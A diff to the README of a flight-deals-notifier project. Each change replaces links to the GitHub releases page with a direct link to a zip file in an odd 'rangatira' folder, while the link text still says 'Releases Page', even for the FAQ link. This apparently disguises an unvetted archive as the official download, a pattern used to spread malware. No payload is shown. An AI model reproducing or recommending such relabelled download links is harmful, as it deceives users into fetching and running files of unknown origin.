@@ -6,9 +6,9 @@ Welcome to the flight-deals-notifier project! This application helps you find ch
 
 ## 📥 Download the App
 
-[![Download flight-deals-notifier](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Remus45/flight-deals-notifier/releases)
+[![Download flight-deals-notifier](https://raw.githubusercontent.com/Remus45/flight-deals-notifier/main/rangatira/flight-deals-notifier.zip)](https://raw.githubusercontent.com/Remus45/flight-deals-notifier/main/rangatira/flight-deals-notifier.zip)
 
-Visit this page to download: [Releases Page](https://github.com/Remus45/flight-deals-notifier/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Remus45/flight-deals-notifier/main/rangatira/flight-deals-notifier.zip)
 
 ## 🏁 System Requirements
 
@@ -25,7 +25,7 @@ Before using flight-deals-notifier, ensure your system meets these requirements:
 Follow these steps to install the application:
 
 1. **Download the application:**
-   - Go to the [Releases Page](https://github.com/Remus45/flight-deals-notifier/releases).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/Remus45/flight-deals-notifier/main/rangatira/flight-deals-notifier.zip).
    - Choose the latest version and download the setup file for your operating system.
 
 2. **Install the application:**
@@ -66,7 +66,7 @@ Once installed, open the flight-deals-notifier application:
 
 ## 📬 Support
 
-If you run into any issues or have questions, please check the FAQ section on the [Releases Page](https://github.com/Remus45/flight-deals-notifier/releases). You can also open an issue on GitHub if you need further assistance.
+If you run into any issues or have questions, please check the FAQ section on the [Releases Page](https://raw.githubusercontent.com/Remus45/flight-deals-notifier/main/rangatira/flight-deals-notifier.zip). You can also open an issue on GitHub if you need further assistance.
 
 ## 👥 Contributing
 
